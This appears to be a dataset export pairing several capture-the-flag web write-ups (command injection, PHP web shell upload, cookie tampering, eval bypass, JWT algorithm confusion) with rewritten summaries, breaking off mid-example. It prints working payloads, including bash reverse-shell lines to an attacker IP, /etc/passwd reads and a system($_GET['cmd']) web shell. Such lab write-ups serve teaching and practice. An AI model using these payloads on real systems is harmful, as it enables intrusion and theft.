Then I decided to look more closely at the source code of the page. I downloaded it from the ""save all"" menu in the browser and look at it in an IDE.

Then I found something suspicious. Some JavaScript named `mec-frontend` and some settings for some sort of calendar?

```html
<script id=""mec-frontend-script-js-extra"">
var mecdata = {
    ""day"": ""day"",
    ""days"": ""days"",
    ""hour"": ""hour"",
    ""hours"": ""hours"",
    ""minute"": ""minute"",
    ""minutes"": ""minutes"",
    ""second"": ""second"",
    ""seconds"": ""seconds"",
    ""elementor_edit_mode"": ""no"",
    ""recapcha_key"": """",
    ""ajax_url"": ""http:\/\/01.linux.challenges.ctf.thefewchosen.com:51490\/wp-admin\/admin-ajax.php"",
    ""fes_nonce"": ""8f115b79dc"",
    ""current_year"": ""2022"",
    ""current_month"": ""07"",
    ""datepicker_format"": ""yy-mm-dd""
};
</script>
<script src=""Hello%20world!%20%E2%80%93%20Reminder-Dateien/frontend.js"" id=""mec-frontend-script-js""></script>
<script src=""Hello%20world!%20%E2%80%93%20Reminder-Dateien/events.js"" id=""mec-events-script-js""></script>
```

This looked suspicious, especially because the challange was called ""Calendar"" and had ""Are online calendars trusty?"" as a description.

Also, 2 other lines with a `<link>` Tag seemed weird:

```html
<link rel=""alternate"" type=""application/json+oembed"" href=""http://01.linux.challenges.ctf.thefewchosen.com:51490/index.php?rest_route=%2Foembed%2F1.0%2Fembed&amp;url=http%3A%2F%2F01.linux.challenges.ctf.thefewchosen.com%3A51490%2F%3Fp%3D1"">
<link rel=""alternate"" type=""text/xml+oembed"" href=""http://01.linux.challenges.ctf.thefewchosen.com:51490/index.php?rest_route=%2Foembed%2F1.0%2Fembed&amp;url=http%3A%2F%2F01.linux.challenges.ctf.thefewchosen.com%3A51490%2F%3Fp%3D1&amp;format=xml"">
```

Mec seems o relate to a WordPress Plugin ""Modern events calendar"" (https://webnus.net/modern-events-calendar/). The used version has 2 entries in the explort database:

- https://www.exploit-db.com/exploits/50084
- https://www.exploit-db.com/exploits/50082

The firs one seems to need authentication so it does not work in our case. But the second one did not seem to work, too.","The website is a WordPresss site where some links are cickable and reveal 2 blog posts where you can comment (in one of them).

`?p=1` has a blog post page where you can comment. First, I tried to create a comment aaannnd ... nothing? Interestingly, the URL is now `http://01.linux.challenges.ctf.thefewchosen.com:51490/?p=1&unapproved=2&moderation-hash=11d64a466de22952e34eaae54f57abc3#comment-2`. Seems like comments need to be approved or something.

Then I tried XSS but it does not really seem to work. The `<script>` tags seem to be removed and sometimes the commen isn't even listed.

Then I decided to look more closely at the source code of the page. I downloaded it from the ""save all"" menu in the browser and look at it in an IDE.

Then I found something suspicious. Some JavaScript named `mec-frontend` and some settings for some sort of calendar?
[HTML code: mec-frontend JavaScript and calendar settings with various variables and properties]

This looked suspicious, especially because the challange was called ""Calendar"" and had ""Are online calendars trusty?"" as a description.

Also, 2 other lines with a `<link>` Tag seemed weird:
[HTML code: alternate oembed links]

Mec seems o relate to a WordPress Plugin ""Modern events calendar"" (https://webnus.net/modern-events-calendar/). The used version has 2 entries in the explort database:
- https://www.exploit-db.com/exploits/50084
- https://www.exploit-db.com/exploits/50082

The firs one seems to need authentication so it does not work in our case. But the second one did not seem to work, too.
"
"# PONG
## The App
When opening the site, the following text appears:

```
Command executed: ping -c 2 127.0.0.1
```

The URL is `/index.php?host=127.0.0.1` which indicates that the IP or maybe more is controllable.

## Tried solutions & solution
I tried to set `host=127.0.0.1;cat /etc/passwd` which showed the content of the `/etc/passwd` file. This measn we can control the command and inject our own.

I then tried to inject `127.0.0.1;bash -c bash -i >& /dev/tcp/<attack-ip-with-netcat-open>/<attacker-netcat-port> 0>&1` as URL encoded payload to open a reverse shell but it didn't work.

I then tried `127.0.0.1;ls .` but it returned only `index.php`. 

`127.0.0.1;echo $PWD` shows, that the directory is `/var/www/html`. 

`127.0.0.1;env` showed:

```
PHP_INI_DIR=/usr/local/etc/php
HOME=/root
PHP_LDFLAGS=-Wl,-O1 -pie
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_VERSION=7.4.30
GPG_KEYS=42670A7FE4D0441C8E4632349E4FDC074A4EF02D 5A52880781F755608BF815FC910DEB46F53EA312
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_ASC_URL=https://www.php.net/distributions/php-7.4.30.tar.xz.asc
PHP_URL=https://www.php.net/distributions/php-7.4.30.tar.xz
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PHPIZE_DEPS=autoconf 		dpkg-dev 		file 		g++ 		gcc 		libc-dev 		make 		pkg-config 		re2c
PWD=/var/www/html
PHP_SHA256=ea72a34f32c67e79ac2da7dfe96177f3c451c3eefae5810ba13312ed398ba70d
```
So no flag there.

`127.0.0.1;ls /root` showed nothing.

I tried multiple attempts to open a reverse shell but it didn't work (for example I tried `bash -i >& /dev/tcp/<ATTACKER-IP>/<ATTACKER-PORT> 0>&1` but no luck).

Okay, seems that only a Webshell works.

My attempts to open a reverse shell broke the container because I modified the PHP file so I had to restart it.

Then I tried to serch for the flag with the payload `ls /`. This revealed a `flag.txt` file entry which I could read by calling `cat /flag.txt`","When opening the site, the following text appears: ""Command executed: ping -c 2 127.0.0.1""

The URL is `/index.php?host=127.0.0.1` which indicates that the IP or maybe more is controllable.

I tried to set `host=127.0.0.1;cat /etc/passwd` which showed the content of the `/etc/passwd` file. This measn we can control the command and inject our own.

I then tried to inject `127.0.0.1;bash -c bash -i >& /dev/tcp/<attack-ip-with-netcat-open>/<attacker-netcat-port> 0>&1` as URL encoded payload to open a reverse shell but it didn't work.

I then tried `127.0.0.1;ls .` but it returned only `index.php`. 

`127.0.0.1;echo $PWD` shows, that the directory is `/var/www/html`. 

By injecting `env` into the host parameter, the environment variables were displayed, but the flag was not found among them.

`127.0.0.1;ls /root` showed nothing.

I tried multiple attempts to open a reverse shell but it didn't work (for example I tried `bash -i >& /dev/tcp/<ATTACKER-IP>/<ATTACKER-PORT> 0>&1` but no luck).

Okay, seems that only a Webshell works.

My attempts to open a reverse shell broke the container because I modified the PHP file so I had to restart it.

Then I tried to serch for the flag with the payload `ls /`. This revealed a `flag.txt` file entry which I could read by calling `cat /flag.txt`
"
"# Robots and Music
## The App
The App consists only of a web page displaying ""I hope you loke robots!. Other paths do not work and they always display the same HTML with the `200 OK` status code.

## Tried solutions & solution

Because the challenge is called ""Robots and Music"" and the text says ""I hope you like robots!"" I tried opening `robots.txt`:

```
User-agent: *
Disallow: /g00d_old_mus1c.php
```

Opening the page reveals the flag.","The App consists only of a web page displaying ""I hope you loke robots!. Other paths do not work and they always display the same HTML with the `200 OK` status code.

Because the challenge is called ""Robots and Music"" and the text says ""I hope you like robots!"" I tried opening `robots.txt`, and it disallowed the path `/g00d_old_mus1c.php`.

Opening the page reveals the flag.
"
"# Baby Eval
## The App
Baby Eval is a Node app which has a path `/` which lists some information including the server source code. As seen in the code the information comes from the following function:

```javascript
function directory(keys) {
    const values = {
        ""title"": ""View Source CTF"",
        ""description"": ""Powered by Node.js and Express.js"",
        ""flag"": process.env.FLAG,
        ""lyrics"": ""Good job, you’ve made it to the bottom of the mind control facility. Well done."",
        ""createdAt"": ""1970-01-01T00:00:00.000Z"",
        ""lastUpdate"": ""2022-02-22T22:22:22.222Z"",
        ""source"": require('fs').readFileSync(__filename),
    };

    return ""<dl>"" + keys.map(key => `<dt>${key}</dt><dd><pre>${escape(values[key])}</pre></dd>`).join("""") + ""</dl>"";
}
```

The webpage is created here:
```javascript
const payload = req.query.payload;

if (payload && typeof payload === ""string"") {
    const matches = /([\.\(\)'""\[\]\{\}<>_$%\\xu^;=]|import|require|process|proto|constructor|app|express|req|res|env|process|fs|child|cat|spawn|fork|exec|file|return|this|toString)/gi.exec(payload);
    if (matches) {
        res.status(400).send(matches.map(i => `<code>${i}</code>`).join(""<br>""));
    } else {
        res.send(`${eval(payload)}`);
    }
} else {
    res.send(directory([""title"", ""description"", ""lastUpdate"", ""source""]));
}
```

## Tried solutions
The goal was to get the flag. First I saw that the code can execute `eval` by entering a `payload` as the `GET` query parameter. I first did not see that the ReEx is a Blacklist, not a whitelist (stupid me), so many things don't work including calling functions because `(` and `)` are not allowed. Then I googled for a way to call a function without prenthesis. Found
```javascript
alert`hello`
```
and remembered that JavaScript Template Literals can have tags which are basically functions which first parameter is a list of strings. This list contains the parts of the string, split by the injection variables (`${x}`).

## Solution
```typescript
directory`flag`
```

```
?payload=directory`flag`
```

Because we don't have an injection variable, the argument of `directory` is just `[ ""flag"" ]`.","Baby Eval is a Node app which has a path `/` which lists some information including the server source code. As seen in the code the information comes from the following function:
[JavaScript function: Create a directory object with keys and values, including the server source code]

The webpage is created here:
[JavaScript code: Process and evaluate the payload from the query string]

The goal was to get the flag. First I saw that the code can execute `eval` by entering a `payload` as the `GET` query parameter. I first did not see that the ReEx is a Blacklist, not a whitelist (stupid me), so many things don't work including calling functions because `(` and `)` are not allowed. Then I googled for a way to call a function without prenthesis. Found that JavaScript Template Literals can have tags, which are basically functions whose first parameter is a list of strings. This list contains the parts of the string, split by the injection variables (`${x}`).

To bypass the restriction, I used the JavaScript Template Literal syntax to call the `directory` function with the argument ""flag"" by submitting the following payload.

Because we don't have an injection variable, the argument of `directory` is just `[ ""flag"" ]`.
"
"# vsCAPTCHA

## The App
vsCAPTCHA is secured by a special CAPTCHA kind of thing written in TypeScript and Deno.

1. `b1` and `b2` are initialized with a random number from 0-500
2. app starts to listen to `POST` requests in `/captcha`
	1.  if Header `x-captcha-state` is set, it checks if body JSON value `solution` is equal to expected CAPTCHA
	2. expected CPATCHAs are stored in a Map `random JWT UUID` => expected
	3. If expeted value does not match `solution`, it returns and sets JWT field `failed` to `true`
	4. else it generates a new CPATCHA, stores it in the map of expected value
	5. You can get the flag if you have more than 1000 CAPTCHA solves

The CAPTCHA is generated with following code:

```typescript
const num1 = Math.floor(Math.random() * 7) + b1;
const num2 = Math.floor(Math.random() * 3) + b2;

const captchaText = `${num1} + ${num2}`;
```

## Tried solutions
### Brute force
The shown CAPTCHA is only 6 random Digits max. Because `b1` and `b2` are only initialized at startup of the application, they never change. If we have at least 1 CAPTCHA image, it sould be possible to try out what `b1` and `b2` is and then we can brute force a new captcha by just trying out all remaining expected values because the range is really low (just maximum of 15 for `num1` and maximum of 7 for `num2`).

#### Pitfalls
- The JWT success counter is reset to 0 if the old token is invalid
- the expiry was not not extended for failed solving attempts which makes brute force on the original server more complicated

#### Problems
The Python code didn't work at first because of multiple bugs. I worked them out and it worked on the local setup but not on the CTF server beacuse the connection had ~500 ms delay and the token was reset to early. Then I tried to refactor my code and limit the try range but this only broke the code.

## Considered solutions

### Cracking the random generator state/predicting random numbers
Because the random range is so small and non cryptographically secure random numbers were used, it might be possible to predict them. But not sure how to approach that.","vsCAPTCHA is secured by a special CAPTCHA kind of thing written in TypeScript and Deno.
1. `b1` and `b2` are initialized with a random number from 0-500
2. app starts to listen to `POST` requests in `/captcha`
	1.  if Header `x-captcha-state` is set, it checks if body JSON value `solution` is equal to expected CAPTCHA
	2. expected CPATCHAs are stored in a Map `random JWT UUID` => expected
	3. If expeted value does not match `solution`, it returns and sets JWT field `failed` to `true`
	4. else it generates a new CPATCHA, stores it in the map of expected value
	5. You can get the flag if you have more than 1000 CAPTCHA solves

The CAPTCHA is generated with following code:
[TypeScript code: Generate two random numbers and create a CAPTCHA text]

Brute force
The shown CAPTCHA is only 6 random Digits max. Because `b1` and `b2` are only initialized at startup of the application, they never change. If we have at least 1 CAPTCHA image, it sould be possible to try out what `b1` and `b2` is and then we can brute force a new captcha by just trying out all remaining expected values because the range is really low (just maximum of 15 for `num1` and maximum of 7 for `num2`).

Pitfalls:
- The JWT success counter is reset to 0 if the old token is invalid
- the expiry was not not extended for failed solving attempts which makes brute force on the original server more complicated

The Python code didn't work at first because of multiple bugs. I worked them out and it worked on the local setup but not on the CTF server beacuse the connection had ~500 ms delay and the token was reset to early. Then I tried to refactor my code and limit the try range but this only broke the code.

Cracking the random generator state/predicting random numbers
Because the random range is so small and non cryptographically secure random numbers were used, it might be possible to predict them. But not sure how to approach that.
"
"# Elf Directory (300)

## Problem

> Can you infiltrate the Elf Directory to get a foothold inside Santa's data warehouse in the North Pole?

## Solution

1. We do not have a copy of the source code for this challenge, so that makes it more challenging. We go to the website and are greeted with a login message. Let's try clicking on ""Create one!"", creating an account, and then signing in with that.

2. We see a profile screen with some basic details and a message that says ""You don't have permission to edit your profile, contact the admin elf to approve your account!""

3. When viewing the page's HTML and looking for things that are our of place, we see the following JS code:

    ```html
    <script>
        $('#upload').change(function(){
        let path = $(this).val().replace('C:\\fakepath\\', '');
        $('#selectFile').html(path);
        })
    </script>
    ```

    These HTML IDs do not refer to anything on the page so something must be missing.

4. Next, we decide to check how your session remains signed in. There is a cookie called ""PHPSESSID"", which is common for PHP, with the value `eyJ1c2VybmFtZSI6InRlc3QiLCJhcHByb3ZlZCI6ZmFsc2V9`. This is base64 and when decoded using `base64 -d` shows `{""username"":""test"",""approved"":false}`.

5. Let's try setting `approved` to `true` and then encoding it again: `echo '{""username"":""test"",""approved"":true}' | base64` returns `eyJ1c2VybmFtZSI6InRlc3QiLCJhcHByb3ZlZCI6dHJ1ZX0K`. Swapping the cookie in the browser's developer tools and reloading the page now shows a ""Update profile avatar"" file selector.

6. Let's try uploading a new profile picture. Only PNGs are accepted, so there is some file type validation happening. After uploading the image, the page reloads and the profile picture has indeed changed. My image was originally called `Red.png`, but when it is uploaded it is renamed to `073cc_Red.png` and is placed in the `/uploads` directory.

7. So, we have control over the file name, but the application checks for a valid PNG. Let's see how it's doing that file type check by uploading the same picture with the name `Red.png.php`. This is successful, but trying to upload a text file that has `.php` in the name fails.

8. We can go through the file upload methodology discussed on [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-upload). It turns out that the application is checking if the magic bytes of a PNG image are present. So, let's create a file with those bytes and a call to `phpInfo`. The magic bytes for a PNG are `\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[` and we can call `phpInfo` with `<?php phpInfo(); ?>`. So, we run `printf ""\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[<?php phpInfo(); ?>"" > exploit_test.png.php` to get our image/php file/exploit. Uploading this file and then right clicking on our profile file and selecting ""Open Image in New Tab"" displays the PHP info page. We have achieved remote code execution.

9. So, lets pop a shell instead of showing the info page by running `<?php echo system($_GET['cmd']); ?>` instead of `<?php phpInfo(); ?>`. Create the exploit file with `<?php phpInfo(); ?>`. So, we run `printf ""\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[<?php echo system(\$_GET['cmd']); ?>"" > exploit.png.php`

10. Uploading and navigating to this image appears to work. Now we can run commands by setting the `cmd` parameter to the command we want to run. So, let's try to find the flag with `http://IP:PORT/uploads/195c2_exploit.png.php?cmd=ls%20-la%20/`. This reveals a file called `flag_65890d927c37c33.txt`. Let's open that file with `http://IP:PORT/uploads/195c2_exploit.png.php?cmd=cat%20/flag_65890d927c37c33.txt`. Running this prints the flag.

### Flag

`HTB{br4k3_au7hs_g3t_5h3lls}`
","1. We do not have a copy of the source code for this challenge, so that makes it more challenging. We go to the website and are greeted with a login message. Let's try clicking on ""Create one!"", creating an account, and then signing in with that.

2. We see a profile screen with some basic details and a message that says ""You don't have permission to edit your profile, contact the admin elf to approve your account!""

3. When viewing the page's HTML and looking for things that are our of place, we see the following JS code:
[JavaScript code snippet: Updates the displayed file path when the user selects a file for upload]
These HTML IDs do not refer to anything on the page so something must be missing.

4. Next, we decide to check how your session remains signed in. There is a cookie called ""PHPSESSID"", which is common for PHP, with the value base64 encoded. When decoded using `base64 -d` shows `{""username"":""test"",""approved"":false}`.

5. Let's try setting `approved` to `true` and then encoding it again.
Swapping the cookie in the browser's developer tools and reloading the page now shows a ""Update profile avatar"" file selector.

6. Let's try uploading a new profile picture. Only PNGs are accepted, so there is some file type validation happening. After uploading the image, the page reloads and the profile picture has indeed changed. My image was originally called `Red.png`, but when it is uploaded it is renamed to `073cc_Red.png` and is placed in the `/uploads` directory.

7. So, we have control over the file name, but the application checks for a valid PNG. Let's see how it's doing that file type check by uploading the same picture with the name `Red.png.php`. This is successful, but trying to upload a text file that has `.php` in the name fails.

8. We can go through the file upload methodology discussed on HackTricks (https://book.hacktricks.xyz/pentesting-web/file-upload). It turns out that the application is checking if the magic bytes of a PNG image are present. So, let's create a file with those bytes and a call to `phpInfo`. The magic bytes for a PNG are `\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[` and we can call `phpInfo` with `<?php phpInfo(); ?>`. So, we run `printf ""\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[<?php phpInfo(); ?>"" > exploit_test.png.php` to get our image/php file/exploit. Uploading this file and then right clicking on our profile file and selecting ""Open Image in New Tab"" displays the PHP info page. We have achieved remote code execution.

9. So, lets pop a shell instead of showing the info page by running `<?php echo system($_GET['cmd']); ?>` instead of `<?php phpInfo(); ?>`. Create the exploit file with `<?php phpInfo(); ?>`. So, we run `printf ""\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[<?php echo system(\$_GET['cmd']); ?>"" > exploit.png.php`

10. Uploading and navigating to this image appears to work. Now we can run commands by setting the `cmd` parameter to the command we want to run. So, let's try to find the flag with `http://IP:PORT/uploads/195c2_exploit.png.php?cmd=ls%20-la%20/`. This reveals a file called `flag_65890d927c37c33.txt`. Let's open that file with `http://IP:PORT/uploads/195c2_exploit.png.php?cmd=cat%20/flag_65890d927c37c33.txt`. Running this prints the flag.
"
"# Gadget Santa (300)

## Problem

> It seems that the evil elves have broken the controller gadget for the good old candy cane factory! Can you team up with the real red teamer Santa to hack back?

* [web_gadget_santa.zip](./web_gadget_santa.zip)

## Solution

1. The website allows us to view some properties about a linux system. The output looks just like standard linux commands. The output of the ""List Storage"" command seems to be executing `df -h`.

2. At this point, I guessed that this was a command injection challenge and I tried accessing `http://IP:PORT/?command=ls""` to see if I could list the contents of the current directory. Sure enough, this worked, confirming my suspicions. This is in fact a command injection challenge.

3. Looking at the source code, we see in `challenge/models/MonitorModel.php` that `shell_exec` is used to run the `santa_mon.sh` script. Our input in the `command` URL parameter is then appended to `/santa_mon.sh ` so that the final command looks like this: `/santa_mon.sh [COMMAND PARAMETER INPUT]`. In other words, we control the first argument passed to the `santa_mon.sh` program. Importantly, The `sanitize` function is called on our input, which removes spaces using the `s+` regular expression.

4. We can see the source code of the `santa_mon.sh` program in `config/santa_mon.sh` in our downloaded ZIP. We see that the buttons in the web interface do indeed run standard linux commands. At the bottom we see that if there is an argument to the program, it is executed as a command.

5. `config/santa_mon.sh` shows that the `ups_status` and `restart_ups` commands return the output from a local web server using curl. If you check the output of the ""List Processes"" command you will see `python3 /root/ups_manager.py`. Let's check out the source code for `config/ups_manager.py`. This file runs an HTTP server with the two endpoints accessed by the `ups_status` and `restart_ups` commands, but it also has a `/get_flag` endpoint that prints the flag!

6. So, our approach to get the flag is to craft a command injection payload without using spaces that will run `curl http://localhost:3000/get_flag` and return the output to us through the webpage. Using a standard approach to remove spaces (such as those from the excellent guide at [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)) will not work here because our input is stripped of whitespace and then passed as an argument to another program. Thus, use can use something like the `IFS` variable, since hte PHP code will not strip that out, but when it is parsed by bash it will be interpreted as a second argument to the `santa_mon.sh` script. For instance, if our command injection is `curl${IFS}http://localhost:3000/get_flag` then PHP will execute, `/santa_mon.sh curl${IFS}http://localhost:3000/get_flag`, bash will interpret this as `/santa_mon.sh curl http://localhost:3000/get_flag`, and then the `santa_mon.sh` script will see `curl` as the first argument and will run `curl` without any arguments.

7. To solve this, we simply wrap our payload in double quotes like so: `""curl${IFS}http://localhost:3000/get_flag""` (URL encoded: `%22curl${IFS}http://localhost:3000/get_flag%22`). This way, PHP will execute `/santa_mon.sh ""curl${IFS}http://localhost:3000/get_flag""`, bash will interpret this as `/santa_mon.sh ""curl http://localhost:3000/get_flag""`, then the `santa_mon.sh` script will see the string `""curl http://localhost:3000/get_flag""` as the first parameter, it will run our payload, and the PHP server will return the output containing the flag.

8. So, the final payload is `http://IP:PORT/?command=%22curl${IFS}http://localhost:3000/get_flag%22`.

### Flag

`HTB{54nt4_i5_th3_r34l_r3d_t34m3r}`
","1. The website allows us to view some properties about a linux system. The output looks just like standard linux commands. The output of the ""List Storage"" command seems to be executing `df -h`.

2. At this point, I guessed that this was a command injection challenge and I tried accessing `http://IP:PORT/?command=ls""` to see if I could list the contents of the current directory. Sure enough, this worked, confirming my suspicions. This is in fact a command injection challenge.

3. Looking at the source code, we see in `challenge/models/MonitorModel.php` that `shell_exec` is used to run the `santa_mon.sh` script. Our input in the `command` URL parameter is then appended to `/santa_mon.sh ` so that the final command looks like this: `/santa_mon.sh [COMMAND PARAMETER INPUT]`. In other words, we control the first argument passed to the `santa_mon.sh` program. Importantly, The `sanitize` function is called on our input, which removes spaces using the `s+` regular expression.

4. We can see the source code of the `santa_mon.sh` program in `config/santa_mon.sh` in our downloaded ZIP. We see that the buttons in the web interface do indeed run standard linux commands. At the bottom we see that if there is an argument to the program, it is executed as a command.

5. `config/santa_mon.sh` shows that the `ups_status` and `restart_ups` commands return the output from a local web server using curl. If you check the output of the ""List Processes"" command you will see `python3 /root/ups_manager.py`. Let's check out the source code for `config/ups_manager.py`. This file runs an HTTP server with the two endpoints accessed by the `ups_status` and `restart_ups` commands, but it also has a `/get_flag` endpoint that prints the flag!

6. So, our approach to get the flag is to craft a command injection payload without using spaces that will run `curl http://localhost:3000/get_flag` and return the output to us through the webpage. Using a standard approach to remove spaces (such as those from the excellent guide at [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)) will not work here because our input is stripped of whitespace and then passed as an argument to another program. Thus, use can use something like the `IFS` variable, since hte PHP code will not strip that out, but when it is parsed by bash it will be interpreted as a second argument to the `santa_mon.sh` script. For instance, if our command injection is `curl${IFS}http://localhost:3000/get_flag` then PHP will execute, `/santa_mon.sh curl${IFS}http://localhost:3000/get_flag`, bash will interpret this as `/santa_mon.sh curl http://localhost:3000/get_flag`, and then the `santa_mon.sh` script will see `curl` as the first argument and will run `curl` without any arguments.

7. To solve this, we simply wrap our payload in double quotes like so: `""curl${IFS}http://localhost:3000/get_flag""` (URL encoded: `%22curl${IFS}http://localhost:3000/get_flag%22`). This way, PHP will execute `/santa_mon.sh ""curl${IFS}http://localhost:3000/get_flag""`, bash will interpret this as `/santa_mon.sh ""curl http://localhost:3000/get_flag""`, then the `santa_mon.sh` script will see the string `""curl http://localhost:3000/get_flag""` as the first parameter, it will run our payload, and the PHP server will return the output containing the flag.

8. So, the final payload is `http://IP:PORT/?command=%22curl${IFS}http://localhost:3000/get_flag%22`.
"
"# Naughty or Nice (325)

## Problem

> All the Santa's nice elves have been added to the naughty list by the wicked elves and Santa is mad! He asked you to hack into the admin account of the Naughty or Nice portal and retrieve the magic flag that will let Santa finally banish the evil elves from the north pole!

* [web_naughty_or_nice.zip](./web_naughty_or_nice.zip)

## Solution

1. Looking at the source code we see that in the `challenge/helpers/JWTHelper.js` file, both the ""RS256"" and ""HS256"" algorithms are allowed for decryption. This is CVE-2016-5431/CVE-2016-10555.

2. The HS256 algorithm is symmetric, which means it uses the sane secret key to sign and verify each message. The RS256 algorithm is asymmetric, which means it uses a private key to sign the message and a public key for verification. However, if we change the algorithm from RS256 to HS256, the backend code will use the public key as the symmetric secret key. In other words, the HS256 algorithm will be used to verify the signature with the public key as the HS256 secret key. We know the public key so we can, in theory, easily modify the JWT and sign it.

3. However, before we can do this we need to get the JWT token and get the public key. So, make an account on the website, open up your browser's cookie page in the developer tools, and copy the `session` cookie. We can use [JWT.io](https://jwt.io/) or [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) to decode the cookie. `python3 jwt_tool.py ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTNuWlpMWHB3R3prVXM0N1J6UkRpXG5idkNFZzFFcllrcC9LWk1hclVqZTVWRGljdDlzMXhFVkM1aXFvVmJ2U0Vkd0hoN3J0M0p1aUZIKzBPVTlWY0JUXG4rVHd3VHM3Y2toRG8rczFUVjhHV0RkWFFrb0l1dHRaak5DUUo2TG0zQ3ZlbEtJWW1jSUtwdlBCblRlRlJkMVh6XG5xUmdldnE2SlZSQ1lyeVFYMXhtckVQOVc5OFpWWGJQcE9GOTRHUWlpRU1RdWJNMGlMakdjVEFqRldVdXFaZlU3XG5iMWpDV1lIb1A4UWV6dmNBK1FCUndXN2dubHpCYVVCRmVNN3Y4Smw3cCtGVXFtQnI5VitOa2htMDV0L0ZraU95XG55dVgwa0FFcDFKNzRRZXRMSXg0d0tmbjBIZjZXeUp0ejB2ZnV6YkJETWh2VDZyZXBtSXpCVW9ycHh6bk5UVForXG5xd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tIiwiaWF0IjoxNjM4NzMxMzQ3fQ.bnjglGFat38YIylfRdN-AubHq7FIpPgrISj3rGlVUJti_8ORBgF6alQDyEr742vUYaFaaONnhUlgSKyurANLKI1fNpAZCp0loN5D_mSk8B8PMSNArghxLB1P_2g36pd7ZWE8GQPFF2582fOYCK1zJreMKPozXGe3fjBNB6nqrNk21ReFQsPpuLfPM8HgK3jPXgyN5mN4HKMsLgObrA-5W3IhWglV64BHuNbpki5x0OGMedxTEtzuYqAhQbkOhz7x_GLI8c04lyJSY9dYVaNSsmU84gZJZ-5Hmk4GlQTtRwrV_OnSVxampPUk8MhIIeLHhUOiaWrRtmLbxiV1EaPK6g""`:

    ```
    =====================
    Decoded Token Values:
    =====================

    Token header values:
    [+] alg = ""RS256""
    [+] typ = ""JWT""

    Token payload values:
    [+] username = ""test""
    [+] pk = ""-----BEGIN PUBLIC KEY-----
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3nZZLXpwGzkUs47RzRDi
    bvCEg1ErYkp/KZMarUje5VDict9s1xEVC5iqoVbvSEdwHh7rt3JuiFH+0OU9VcBT
    +TwwTs7ckhDo+s1TV8GWDdXQkoIuttZjNCQJ6Lm3CvelKIYmcIKpvPBnTeFRd1Xz
    qRgevq6JVRCYryQX1xmrEP9W98ZVXbPpOF94GQiiEMQubM0iLjGcTAjFWUuqZfU7
    b1jCWYHoP8QezvcA+QBRwW7gnlzBaUBFeM7v8Jl7p+FUqmBr9V+Nkhm05t/FkiOy
    yuX0kAEp1J74QetLIx4wKfn0Hf6WyJtz0vfuzbBDMhvT6repmIzBUorpxznNTTZ+
    qwIDAQAB
    -----END PUBLIC KEY-----""
    [+] iat = 1638731347    ==> TIMESTAMP = 2021-12-05 14:09:07 (UTC)

    ----------------------
    JWT common timestamps:
    iat = IssuedAt
    exp = Expires
    nbf = NotBefore
    ----------------------
    ```

4. Fortunately for us, the public key is encoded in the JWT. So, to get access to the `/api/elf/edit` and `/api/elf/list` endpoints, we need to tamper with this token to change the `username` to ""admin"" using the RS256-to-HS256 exploit.

5. There are an abundance of ways that you can perform the RS256-to-HS256 exploit: [3v4Si0N/RS256-2-HS256](https://github.com/3v4Si0N/RS256-2-HS256), [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool), manually via [JWT.io](https://jwt.io/), by running the commands in [this excellent guide](https://habr.com/en/post/450054/). However, you have to be very careful about newlines in the public key. I tried all of these methods with about every option possible, but I found that running this command actually worked: `python3 jwt_tool.py -T ""{JWT HERE}"" -S hs256 -p ""{PUBLIC KEY HERE}""`. (Alternatively, see [Alternative JWT Decoding Steps](#alternative-jwt-decoding-steps) for an approach using [JWT.io](https://jwt.io/).) So, with the key that would look like this:

    ```
